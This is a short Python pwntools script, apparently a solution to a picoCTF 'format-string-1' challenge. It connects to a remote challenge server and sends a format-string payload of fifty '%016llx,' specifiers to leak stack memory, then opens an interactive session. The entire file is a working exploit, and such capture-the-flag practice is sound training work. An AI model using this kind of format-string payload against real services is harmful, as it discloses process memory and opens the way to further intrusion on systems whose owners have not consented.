from pwn import *

host = 'mimas.picoctf.net'
port = 54156
p = remote(host, port)
# p = process("./format-string-1")

payload = b"%016llx," * 50

p.sendline(payload)
p.interactive()
